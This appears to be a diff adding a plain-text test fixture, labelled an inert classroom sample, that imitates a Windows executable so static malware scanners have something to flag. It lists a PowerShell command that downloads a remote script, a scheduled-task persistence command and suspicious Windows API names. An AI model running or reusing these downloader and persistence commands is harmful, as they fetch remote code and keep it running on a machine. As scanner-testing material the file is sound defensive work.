@@ -1,0 +1,17 @@
+MZ
+Inert classroom sample for static scanner testing.
+This file is plain text and should not be executed.
+
+Simulated persistence and downloader indicators:
+powershell Invoke-WebRequest http://203.0.113.10/update.ps1
+cmd.exe /c schtasks /create /sc minute /tn updater
+ShellExecuteA
+CreateProcessA
+VirtualAlloc
+payload
+inject
+socket(
+connect(
+InternetOpenA
+URLDownloadToFileA
+https://example.invalid/update
